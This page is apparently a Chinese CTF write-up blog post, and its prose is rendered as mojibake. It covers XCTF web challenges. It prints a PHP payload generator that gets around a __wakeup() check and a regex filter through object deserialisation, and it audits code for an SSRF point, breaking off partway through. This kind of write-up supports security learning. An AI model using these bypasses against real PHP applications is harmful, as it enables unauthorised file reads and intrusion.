<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ã€XCTFã€‘ Webè¿›é˜¶åŒº WriteUp æ±‡æ€» | Sma11New</title><meta name="keywords" content="XCTF"><meta name="author" content="Sma11New"><meta name="copyright" content="Sma11New"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="â­ Web_php_unserializeï¼ˆ__wakeup()ç»•è¿‡+æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰ä¸€ä¸ªååºåˆ—åŒ–é¢˜ç›®ï¼Œé¡µé¢ç›´æ¥ç»™å‡ºäº†æºç ï¼š 123456789101112131415161718192021222324252627&lt;?php class Demo &amp;#123;     private $file &#x3D; &amp;#x27;index.php&amp;#x27;;    public function __co">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€XCTFã€‘ Webè¿›é˜¶åŒº WriteUp æ±‡æ€»">
<meta property="og:url" content="https://blog.sma11new.com/post/20200972133.html">
<meta property="og:site_name" content="Sma11New">
<meta property="og:description" content="â­ Web_php_unserializeï¼ˆ__wakeup()ç»•è¿‡+æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰ä¸€ä¸ªååºåˆ—åŒ–é¢˜ç›®ï¼Œé¡µé¢ç›´æ¥ç»™å‡ºäº†æºç ï¼š 123456789101112131415161718192021222324252627&lt;?php class Demo &amp;#123;     private $file &#x3D; &amp;#x27;index.php&amp;#x27;;    public function __co">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-09-07T13:33:40.000Z">
<meta property="article:modified_time" content="2020-11-01T13:37:40.000Z">
<meta property="article:author" content="Sma11New">
<meta property="article:tag" content="XCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/XiaoXin.png"><link rel="canonical" href="https://blog.sma11new.com/post/20200972133"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"ä½ å·²åˆ‡æ¢ä¸ºç¹ä½“","cht_to_chs":"ä½ å·²åˆ‡æ¢ä¸ºç®€ä½“","day_to_night":"ä½ å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼","night_to_day":"ä½ å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2020-11-01 21:37:40'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/XiaoXin.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Sma11New</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ã€XCTFã€‘ Webè¿›é˜¶åŒº WriteUp æ±‡æ€»</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2020-09-07T13:33:40.000Z" title="å‘è¡¨äº 2020-09-07 21:33:40">2020-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2020-11-01T13:37:40.000Z" title="æ›´æ–°äº 2020-11-01 21:37:40">2020-11-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="â­-Web-php-unserializeï¼ˆ-wakeup-ç»•è¿‡-æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰"><a href="#â­-Web-php-unserializeï¼ˆ-wakeup-ç»•è¿‡-æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰" class="headerlink" title="â­ Web_php_unserializeï¼ˆ__wakeup()ç»•è¿‡+æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰"></a>â­ Web_php_unserializeï¼ˆ__wakeup()ç»•è¿‡+æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰</h2><p>ä¸€ä¸ªååºåˆ—åŒ–é¢˜ç›®ï¼Œé¡µé¢ç›´æ¥ç»™å‡ºäº†æºç ï¼š</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p><strong>è¿›è¡Œç®€å•çš„å®¡è®¡</strong></p>
<p>å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªDemoç±»ï¼Œç±»ä¸­å®šä¹‰ç§æœ‰å±æ€§$fileä¸ºæ–‡ä»¶åï¼Œå¹¶åˆå§‹åŒ–äº†ä¸‰ä¸ªé­”æœ¯æ–¹æ³•ï¼š</p>
<ul>
<li>__construct() æ„é€ å‡½æ•°åœ¨å®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œ</li>
<li>__destruct() ææ„å‡½æ•°åœ¨é”€æ¯å¯¹è±¡æ—¶æ‰§è¡Œ</li>
<li>__wakeup() åœ¨ååºåˆ—åŒ–å‰æ‰§è¡Œ</li>
</ul>
<p>å…¶ä¸­<code>__wakeup()</code>ä¸­ç»™å‡ºflagæ–‡ä»¶çš„æç¤ºï¼Œä½†æ˜¯å¦‚æœæ‰§è¡Œè¯¥å‡½æ•°ï¼Œåˆ™ä¼šå¼ºåˆ¶å°†åŒ…å«æ–‡ä»¶æ”¹ä¸ºindex.phpï¼Œå› æ­¤æ­¤å¤„æ˜¯ä¸€ä¸ªè¿‡æ»¤ç‚¹ï¼Œéœ€è¦ç»•è¿‡ã€‚<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602570893.png" alt="1602570853115.png"></p>
<p>ç»§ç»­å¾€ä¸‹ï¼Œä¸€ä¸ªif elseå­å¥è¯­å¥ï¼ŒGETæ¥æ”¶varå‚æ•°å¹¶è¿›è¡Œbase64è§£ç ï¼Œç„¶å<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>åšè¿‡æ»¤ï¼Œå…¶ä¸­æ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰æ˜¯ï¼šåŒ¹é…<strong>o:ä»»æ„æ•°å­—</strong>æˆ–<strong>c:ä»»æ„æ•°å­—</strong>ï¼ŒåŒ¹é…åˆ°åˆ™ç»ˆæ­¢ç¨‹åºï¼Œå› æ­¤è¿™é‡Œä¹Ÿè®¸è¦ç»•è¿‡ã€‚<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602570808.png" alt="1602570787053.png"></p>
<p>æ€»å…±æœ‰ä¸¤ä¸ªè¿‡æ»¤ç‚¹éœ€è¦ç»•è¿‡ï¼Œå…ˆç¼–å†™ä»£ç å¯¹Demoç±»å®ä¾‹åŒ–å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š </p>
<pre><code><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;\00Demo\00file&quot;;s:8:&quot;fl4g.php&quot;;&#125; </span><br></pre></td></tr></table></figure>
</code></pre>
<p>(\00ä¸ºæ‰‹åŠ¨æ·»åŠ ï¼Œå› ä¸ºæ˜¯ç§æœ‰å±æ€§ï¼Œä½†æ˜¯\00åœ¨é¡µé¢ä¸ä¼šæ˜¾ç¤ºï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨æ·»åŠ )</p>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<ol>
<li>ç»•è¿‡æ‰§è¡Œ==__wakeup()==é­”æœ¯æ–¹æ³•ï¼Œæ ¹æ®ä¹‹å‰åšçš„é¢˜ç›®ï¼Œåªéœ€è¦å°†åºåˆ—åŒ–åçš„Jsonä¸²ä¸­çš„å±æ€§ä¸ªæ•°ä¿®æ”¹ä¸ºå¤§äºçœŸå®å±æ€§ä¸ªæ•°å³å¯ç»•è¿‡æ‰§è¡Œè¯¥é­”æœ¯æ–¹æ³•</li>
<li>ç»•è¿‡<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>å¯¹åºåˆ—åŒ–çš„åŒ¹é…ï¼Œå°†O:4æ”¹ä¸ºO:+4å³å¯ï¼Œå› ä¸º+4ç­‰åŒäº4</li>
</ol>
<p>æ‰€ä»¥ï¼Œåœ¨æºç çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ åºåˆ—åŒ–ä»¥åŠå­—ç¬¦æ›¿æ¢çš„ä»£ç ï¼Œå¹¶ç›´æ¥è¾“å‡ºbase64ç¼–ç åçš„åºåˆ—åŒ–ç»“æœï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"><span class="variable">$se</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$se</span> = str_replace(<span class="string">&quot;O:4&quot;</span>, <span class="string">&quot;O:+4&quot;</span>, <span class="variable">$se</span>);</span><br><span class="line"><span class="variable">$se</span> = str_replace(<span class="string">&#x27;&quot;Demo&quot;:1&#x27;</span>, <span class="string">&#x27;&quot;Demo&quot;:2&#x27;</span>, <span class="variable">$se</span>);</span><br><span class="line"><span class="keyword">print</span>(base64_encode(<span class="variable">$se</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p>GETä¼ é€’base64ç¼–ç ç»“æœï¼Œå¾—åˆ°flag<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569811.png" alt="1602427435111.png"></p>
<p>ä¹Ÿå¯ä»¥åœ¨çº¿ç¼–ç ï¼Œä½†æ˜¯æ³¨æ„éœ€è¦åœ¨Demoå·¦å³æ·»åŠ \00ï¼Œå› ä¸ºç§æœ‰å±æ€§privateåœ¨åºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨æ·»åŠ ç±»ååŠ\00ä¸å¯æ‰“å°ç¬¦å·ï¼Œä½†æ˜¯æŸ¥çœ‹æºç æ˜¯å¯ä»¥å‘ç°çš„ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569824.png" alt="1602430789230.png"></p>
<p>æ‰€ä»¥åœ¨æ‰‹åŠ¨ä¿®æ”¹æ•°æ®å¹¶base64æ—¶ï¼Œéœ€è¦æ·»åŠ \00<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569832.png" alt="1602430889005.png"></p>
<h2 id="â­-fakebookï¼ˆSSRF-SQLæ³¨å…¥ï¼‰"><a href="#â­-fakebookï¼ˆSSRF-SQLæ³¨å…¥ï¼‰" class="headerlink" title="â­ fakebookï¼ˆSSRF+SQLæ³¨å…¥ï¼‰"></a>â­ fakebookï¼ˆSSRF+SQLæ³¨å…¥ï¼‰</h2><p>4æ˜Ÿéš¾åº¦çš„é¢˜ç›®ï¼Œä»è¿™é“é¢˜å¼€å§‹æ˜æ˜¾æ„Ÿè§‰åˆ°æœ‰äº›åƒåŠ›ï¼Œèƒ½åšå‡ºæ¥å¾—ç›Šäºå¸ˆå‚…ä»¬çš„wpæ–‡ç« ã€‚</p>
<p>é¦–å…ˆæ‰«æç½‘ç«™ç›®å½•ï¼Œå‘ç°å­˜åœ¨flag.phpæ–‡ä»¶ï¼Œåœ¨robots.txtä¸­å‘ç°äº†user.php.bakæ–‡ä»¶ï¼Œè®¿é—®è¯¥æ–‡ä»¶ä¿å­˜è‡³æœ¬åœ°ï¼Œæ˜¯phpæºç ï¼Œè¿›è¡Œä»£ç å®¡è®¡ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡å®¡è®¡å‘ç°ï¼Œåœ¨getå‡½æ•°ä¸­ï¼Œç¬¬23è¡Œæ²¡æœ‰å¯¹ä¼ å…¥çš„urlï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·æŒ‡å®šçš„è‡ªå·±çš„Blogåœ°å€åšå®‰å…¨æ ¡éªŒï¼Œå¯¼è‡´æ­¤å¤„å¯èƒ½<strong>å­˜åœ¨SSRFæ¼æ´</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨isValidBlogå‡½æ•°ä¸­ï¼Œç¬¬41è¡Œå¯¹blogåšäº†æ­£åˆ™åŒ¹é…ï¼Œå¿…é¡»è¾“å…¥ç½‘å€æ ¼å¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br></pre></td></tr></table></figure>
<p>å·²çŸ¥å¯èƒ½å­˜åœ¨SSRFï¼Œåˆæœ‰**isValidBlog()**å‡½æ•°è¿‡æ»¤ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯åœ¨è¾“å…¥çš„æ—¶å€™è¿‡æ»¤è¿˜æ˜¯æŸ¥è¯¢çš„æ—¶å€™åŒæ ·è¿‡æ»¤ï¼Œå¦‚æœæ˜¯åªåœ¨è¾“å…¥çš„æ—¶å€™è¿‡æ»¤ï¼Œé‚£ä¹ˆåªéœ€è¦æƒ³åŠæ³•å°†SSRFåˆ©ç”¨ä»£ç ä¼ å…¥æ•°æ®åº“ï¼ŒæŸ¥è¯¢å³å¯ï¼›å¦‚æœæ˜¯æŸ¥è¯¢å‰è¿‡æ»¤ï¼Œé‚£å°±å¾—å¦å¯»ä»–æ³•äº†ã€‚</p>
